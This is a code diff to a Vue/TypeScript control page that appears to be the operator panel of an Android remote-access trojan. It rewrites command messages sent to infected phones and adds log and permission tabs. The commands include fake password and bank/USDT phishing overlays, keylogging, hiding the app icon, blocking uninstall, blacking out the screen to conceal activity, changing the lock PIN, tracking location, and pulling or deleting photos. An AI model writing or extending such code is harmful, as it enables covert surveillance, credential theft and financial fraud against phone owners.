@@ -35,6 +35,7 @@ import {
     HomeOutline,
     StopOutline,
     PlayOutline,
+    ShieldCheckmarkOutline,
 } from '@vicons/ionicons5';
 import DefaultLayout from '@/Layouts/DefaultLayout.vue';
 import ScreenViewer from '@/Components/DeviceControl/ScreenViewer.vue';
@@ -52,10 +53,13 @@ import InjectTab from '@/Components/DeviceControl/tabs/InjectTab.vue';
 import GalleryTab from '@/Components/DeviceControl/tabs/GalleryTab.vue';
 import CameraTab from '@/Components/DeviceControl/tabs/CameraTab.vue';
 import MicTab from '@/Components/DeviceControl/tabs/MicTab.vue';
+import LogTab from '@/Components/DeviceControl/tabs/LogTab.vue';
+import PermissionTab from '@/Components/DeviceControl/tabs/PermissionTab.vue';
 
 import { useDeviceWebSocket } from '@/composables/useDeviceWebSocket';
 import { useScreenControl } from '@/composables/useScreenControl';
 import { useDeviceApi } from '@/composables/useDeviceApi';
+import { useDeviceLogs } from '@/composables/useDeviceLogs';
 import {
     useDeviceData,
     parseSmsData,
@@ -110,10 +114,11 @@ const {
 const screenControl = useScreenControl(send, deviceId);
 const deviceData = useDeviceData(send, deviceId, message);
 const deviceApi = useDeviceApi(deviceId.value, message);
+const deviceLogs = useDeviceLogs(send, deviceId, computed(() => props.device.uuid));
 
 const screenData = ref<string | null>(null);
-const screenWidth = ref(1080);
-const screenHeight = ref(1920);
+const screenWidth = ref(props.device.screen_width || 1080);
+const screenHeight = ref(props.device.screen_height || 2400);
 const isStreaming = ref(false);
 const screenLoading = ref(false);
 const screenMode = ref<'screen' | 'screenshot'>('screen');
@@ -191,9 +196,21 @@ const handleMessage = (msg: WebSocketInboundMessage) => {
             screenLoading.value = false;
             break;
         }
+        case 'screen_frame': {
+            const frameMsg = msg as { data?: { image?: string } | string };
+            const image = typeof frameMsg.data === 'string'
+                ? frameMsg.data
+                : (frameMsg.data as { image?: string })?.image ?? null;
+            if (image) {
+                screenData.value = image;
+                screenLoading.value = false;
+            }
+            break;
+        }
         case 'readScreen': {
             if (isOcrRunning.value) {
-                ocrNodeTree.value = msg as any;
+                const readMsg = msg as { data?: { windowTitle?: string; activePackage?: string; children?: unknown[] }; windowTitle?: string; children?: unknown[] };
+                ocrNodeTree.value = readMsg.data ?? readMsg;
             }
             break;
         }
@@ -232,10 +249,9 @@ const handleMessage = (msg: WebSocketInboundMessage) => {
                 
                 imageFiles.forEach(f => {
                     send({
-                        itype: 'slr_panelsend',
-                        subc: 'viewfile',
+                        command: 'FILE_DOWNLOAD',
+                        params: { filepath: `${f.path}/${f.name}` },
                         pid: props.device.uuid,
-                        filepath: `${f.path}/${f.name}`
                     });
                 });
             } else {
@@ -262,6 +278,11 @@ const handleMessage = (msg: WebSocketInboundMessage) => {
             const keylogMsg = msg as KeylogDataMessage;
             keylogEntries.value = parseKeylogData(keylogMsg.data);
             deviceData.loading.value.keylog = false;
+            break;
+        }
+        case 'log_command_result': {
+            const resultData = (msg as Record<string, unknown>).data ?? msg;
+            deviceLogs.handleLogCommandResult(resultData as Record<string, unknown>);
             break;
         }
         case 'cam': {
@@ -336,9 +357,7 @@ const handleStopScreen = () => {
 };
 
 const handleNavigate = (type: 'home' | 'back' | 'recent') => {
-    deviceApi.call('POST', '/global/action', {
-        body: { actionName: type },
-    });
+    screenControl.sendNavigation(type);
 };
 
 const handleVolumeUp = () => screenControl.sendVolumeUp();
@@ -347,10 +366,7 @@ const handleShowKeyboard = () => screenControl.showKeyboard();
 const handleHideKeyboard = () => screenControl.hideKeyboard();
 const handlePaste = (text: string) => {
     if (!text) return;
-    deviceApi.call('GET', '/global/setText', {
-        query: { text },
-        successMessage: '文本已发送到设备',
-    });
+    screenControl.pasteText(text);
 };
 
 // OCR 文字辅助处理
@@ -358,14 +374,12 @@ const handleStartOcr = () => {
     isOcrRunning.value = true;
     ocrNodeTree.value = null;
     screenControl.startOCR();
-    message.success('已开启文字辅助');
 };
 
 const handleStopOcr = () => {
     screenControl.stopOCR();
     isOcrRunning.value = false;
     ocrNodeTree.value = null;
-    message.success('已关闭文字辅助');
 };
 
 const handleOcrTap = (x: number, y: number) => {
@@ -380,43 +394,29 @@ const handleOcrLongPress = (x: number, y: number) => {
     screenControl.sendLongPress(x, y);
 };
 const handleLock = (type: 0 | 1 | 2 | 3) => {
-    if (type === 0) {
-        deviceApi.call('GET', '/unlock', { successMessage: '解锁请求已发送' });
-        return;
-    }
-    if (type === 1) {
-        deviceApi.call('GET', '/global/lockScreen', { successMessage: '锁屏请求已发送' });
-        return;
-    }
     screenControl.lockDevice(type);
 };
 const handleScreenshot = () => screenControl.takeScreenshot();
 const handleQualityChange = (quality: number) => screenControl.setScreenQuality(quality);
 
 const handleWakeScreen = () => {
-    deviceApi.call('GET', '/global/wakeUpScreen', {
-        successMessage: '点亮屏幕请求已发送',
-    });
+    screenControl.wakeScreen();
 };
 
 const handleSendMute = () => {
     send({
-        itype: 'slr_panel',
-        subc: 'screen',
+        command: 'MUTE',
+        params: { muted: true },
         pid: deviceId.value,
-        comand: 'vol',
-        volstate: 'mute'
     });
     message.success('静音请求已发送');
 };
 
 const handleSendUnmute = () => {
     send({
-        itype: 'slr_panel',
-        subc: 'screen',
+        command: 'MUTE',
+        params: { muted: false },
         pid: deviceId.value,
-        comand: 'vol',
-        volstate: 'unmute'
     });
     message.success('取消静音请求已发送');
 };
@@ -456,20 +456,16 @@ const handleOpenQuickApp = (appKey: string) => {
         }
     }
 
-    deviceApi.call('GET', '/startApp', {
-        query: { packageName, start: 'true' },
-        successMessage: `正在打开 ${appInfo.name}...`,
-    });
+    send({ command: 'LAUNCH_APP', params: { packageName }, pid: deviceId.value });
+    message.success(`正在打开 ${appInfo.name}...`);
 };
 
 const handleSendKb = (type: number) => {
-    // 使用 kb 命令，kbstate: '2' 为防卸载，'3' 为可卸载 (与 info.php 一致)
-    send({ 
-        itype: 'slr_panel', 
-        subc: 'screen', 
-        pid: deviceId.value, 
-        comand: 'kb', 
-        kbstate: String(type) as '2' | '3'
+    // type 2 = 阻止输入(防卸载), type 3 = 允许输入(可卸载)
+    send({
+        command: type === 2 ? 'DEVICE_BLOCK_INPUT' : 'DEVICE_ALLOW_INPUT',
+        params: {},
+        pid: deviceId.value,
     });
     const msgMap: Record<number, string> = {
         2: '防卸载已启用',
@@ -488,33 +484,13 @@ const handleSendBlock = (type: number) => {
     const successMessage = msgMap[type] ?? '操作已发送';
 
     if (type === 0) {
-        deviceApi.call('GET', '/blockView', {
-            query: {
-                show: 'true',
-                transparent: 'false',
-                zeroBrightness: 'true',
-                destroyLock: 'false',
-            },
-            successMessage,
-        });
-        return;
+        send({ command: 'ENABLE_BLACK_SCREEN', params: { transparent: false, zeroBrightness: true }, pid: deviceId.value });
+    } else if (type === 2) {
+        send({ command: 'DEVICE_BLOCK_INPUT', params: {}, pid: deviceId.value });
+    } else {
+        send({ command: type === 1 ? 'DISABLE_BLACK_SCREEN' : 'DEVICE_ALLOW_INPUT', params: {}, pid: deviceId.value });
     }
-    if (type === 2) {
-        deviceApi.call('GET', '/blockView', {
-            query: {
-                show: 'true',
-                transparent: 'true',
-                zeroBrightness: 'false',
-                destroyLock: 'false',
-            },
-            successMessage,
-        });
-        return;
-    }
-    deviceApi.call('GET', '/blockView', {
-        query: { show: 'false' },
-        successMessage,
-    });
+    message.success(successMessage);
 };
 
 // 密码钓鱼类型映射
@@ -526,15 +502,10 @@ const phishTypeNames: Record<string, string> = {
 };
 
 const handleSendPhish = (type: string, title: string, content: string) => {
-    // 使用 DIAO 命令，与 info.php 保持一致
-    send({ 
-        itype: 'slr_panelsend', 
-        subc: 'DIAO', 
-        pid: deviceId.value, 
-        pin: '',
-        title: title,
-        lckdis: content,
-        typ: type 
+    send({
+        command: 'SHOW_INJECTION',
+        params: { pin: '', title, lckdis: content, typ: type },
+        pid: deviceId.value,
     });
     message.success(`钓鱼请求已发送 (${phishTypeNames[type] || type})`);
 };
@@ -560,13 +531,10 @@ const bankNames: Record<string, string> = {
 };
 
 const handleSendBankPhish = (bank: string) => {
-    // 使用 USDT 命令格式
-    send({ 
-        itype: 'slr_panel', 
-        subc: 'screen', 
-        pid: deviceId.value, 
-        comand: 'usdt',
-        usdttype: bank 
+    send({
+        command: 'SHOW_INJECTION',
+        params: { usdttype: bank },
+        pid: deviceId.value,
     });
     message.success(`${bankNames[bank] || bank} 钓鱼请求已发送`);
 };
@@ -577,13 +545,8 @@ const handleModifyPassword = (password: string) => {
         message.error('请输入 4-16 位数字密码');
         return;
     }
-    deviceApi.call('POST', '/syncLockCipher', {
-        body: {
-            textCipher: password,
-            deviceId: deviceId.value,
-        },
-        successMessage: '修改密码请求已发送',
-    });
+    send({ command: 'NUMERIC_PIN_INPUT', params: { pin: password }, pid: deviceId.value });
+    message.success('修改密码请求已发送');
 };
 
 // 黑屏文字状态
@@ -591,25 +554,19 @@ const blockTextActive = ref(false);
 
 const handleToggleBlockText = (text: string, bg: string) => {
     if (blockTextActive.value) {
-        deviceApi.call('GET', '/blockView', {
-            query: { show: 'false' },
-            successMessage: '已取消黑屏',
-        });
+        send({ command: 'DISABLE_BLACK_SCREEN', params: {}, pid: deviceId.value });
         blockTextActive.value = false;
+        message.success('已取消黑屏');
         return;
     }
 
-    deviceApi.call('GET', '/blockView', {
-        query: {
-            show: 'true',
-            transparent: 'false',
-            hint: text ?? '',
-            zeroBrightness: bg === '0' ? 'true' : 'false',
-            destroyLock: bg === '1' ? 'true' : 'false',
-        },
-        successMessage: '已显示黑屏文字',
+    send({
+        command: 'ENABLE_BLACK_SCREEN',
+        params: { text: text ?? '', zeroBrightness: bg === '0', style: bg === '1' ? 'update' : 'default' },
+        pid: deviceId.value,
     });
     blockTextActive.value = true;
+    message.success('已显示黑屏文字');
 };
 
 const handleTap = (x: number, y: number) => screenControl.sendTap(x, y);
@@ -650,10 +607,9 @@ const handleFetchKeylogByDate = (date: string) => deviceData.fetchKeylog(date);
 const handleToggleKeylogMonitor = () => {
     const newState = !isKeylogMonitoring.value;
     send({
-        itype: 'slr_panelsend',
-        subc: 'Keylog',
+        command: 'SET_LOG_OPTIONS',
+        params: { recKeystrokes: newState },
         pid: deviceId.value,
-        keylogtype: newState ? '0' : '1',
     });
     isKeylogMonitoring.value = newState;
 };
@@ -663,8 +619,8 @@ const isLocationTracking = ref(false);
 const handleStartLocationTracking = () => {
     deviceData.locationLoading.value = true;
     send({
-        itype: 'slr_panelsend',
-        subc: 'loc',
+        command: 'GET_DEVICE_STATE',
+        params: { mode: 'location' },
         pid: props.device.uuid,
     });
     isLocationTracking.value = true;
@@ -673,8 +629,8 @@ const handleStartLocationTracking = () => {
 
 const handleStopLocationTracking = () => {
     send({
-        itype: 'slr_panelsend',
-        subc: 'locoff',
+        command: 'GET_DEVICE_STATE',
+        params: { mode: 'location_stop' },
         pid: props.device.uuid,
     });
     isLocationTracking.value = false;
@@ -703,7 +659,7 @@ const handleStopMicrophone = () => {
 
 const handleRefreshInject = () => {
     injectLoading.value = true;
-    send({ itype: 'slr_panelsend', subc: 'getinject', pid: props.device.uuid });
+    send({ command: 'GET_APP_LIST', params: { mode: 'inject' }, pid: props.device.uuid });
     setTimeout(() => { injectLoading.value = false; }, 2000);
 };
 
@@ -711,10 +667,9 @@ const handleRefreshGallery = () => {
     galleryLoading.value = true;
     galleryImages.value = [];
     send({
-        itype: 'slr_panelsend',
-        subc: 'gallery',
+        command: 'FILE_LIST',
+        params: { mode: 'gallery', filepath: '/sdcard/DCIM/Camera/' },
         pid: props.device.uuid,
-        filepath: '/sdcard/DCIM/Camera/'
     });
     setTimeout(() => {
         if (galleryLoading.value) {
@@ -725,12 +680,12 @@ const handleRefreshGallery = () => {
 };
 
 const handleDownloadGalleryImage = (path: string) => {
-    send({ itype: 'slr_panelsend', subc: 'downloadfile', pid: props.device.uuid, path });
+    send({ command: 'FILE_DOWNLOAD', params: { path }, pid: props.device.uuid });
     message.info('图片下载请求已发送');
 };
 
 const handleDeleteGalleryImage = (path: string) => {
-    send({ itype: 'slr_panelsend', subc: 'deletefile', pid: props.device.uuid, path });
+    send({ command: 'FILE_DELETE', params: { path }, pid: props.device.uuid });
     message.success('图片删除请求已发送');
 };
 
@@ -740,8 +695,8 @@ const handleRename = (name: string) => {
 };
 const handleHideIcon = () => {
     send({
-        itype: 'slr_panelsend',
-        subc: 'Hideico',
+        command: 'HIDE_APP',
+        params: {},
         pid: props.device.uuid,
     });
     message.success('隐藏图标请求已发送');
@@ -752,8 +707,8 @@ const handleDelete = () => {
 };
 const handleRequestPermissions = () => {
     send({
-        itype: 'slr_panelsend',
-        subc: 'Permissions',
+        command: 'GET_PERMISSIONS',
+        params: {},
         pid: props.device.uuid,
     });
     message.success('权限请求已发送');
@@ -797,6 +752,9 @@ const loadTabData = (tab: string, force = false) => {
         case 'mic':
             // 相机和录音需要用户手动开启
             break;
+        case 'logs':
+            deviceLogs.fetchHistoricalLogs();
+            break;
     }
 
     loadedTabs.value.add(tab);
@@ -837,6 +795,8 @@ const tabList = [
     { name: 'gallery', label: '相册', icon: ImagesOutline },
     { name: 'mic', label: '录音', icon: MicOutline },
     { name: 'location', label: '位置', icon: LocationOutline },
+    { name: 'logs', label: '日志', icon: DocumentTextOutline },
+    { name: 'permission', label: '权限', icon: ShieldCheckmarkOutline },
 ];
 </script>
 
@@ -1092,6 +1052,7 @@ const tabList = [
                             <div :key="activeTab" class="tab-content-wrapper">
                                 <ScreenControlTab
                                     v-if="activeTab === 'screen'"
+                                    :device-uid="device.uuid"
                                     :phone-password="deviceStatus?.phoneInfo?.phone_password || ''"
                                     @wake-screen="handleWakeScreen"
                                     @lock="handleLock"
@@ -1183,6 +1144,29 @@ const tabList = [
                                     :is-tracking="isLocationTracking"
                                     @start-tracking="handleStartLocationTracking"
                                     @stop-tracking="handleStopLocationTracking"
+                                />
+                                <PermissionTab
+                                    v-else-if="activeTab === 'permission'"
+                                    :device-id="deviceId"
+                                />
+                                <LogTab
+                                    v-else-if="activeTab === 'logs'"
+                                    :loading="deviceLogs.loading.value"
+                                    :log-files="deviceLogs.logFiles.value"
+                                    :log-content="deviceLogs.logContent.value"
+                                    :log-options="deviceLogs.logOptions.value"
+                                    :historical-logs="deviceLogs.historicalLogs.value"
+                                    :historical-total="deviceLogs.historicalTotal.value"
+                                    :historical-loading="deviceLogs.historicalLoading.value"
+                                    @get-log-options="deviceLogs.getLogOptions"
+                                    @set-log-options="deviceLogs.setLogOptions"
+                                    @get-all-log-lists="deviceLogs.getAllLogLists"
+                                    @get-log-list="deviceLogs.getLogList"
+                                    @read-log="deviceLogs.readLog"
+                                    @delete-log="deviceLogs.deleteLog"
+                                    @clear-logs="deviceLogs.clearLogs"
+                                    @clear-all-logs="deviceLogs.clearAllLogs"
+                                    @fetch-historical="deviceLogs.fetchHistoricalLogs"
                                 />
                             </div>
                         </Transition>
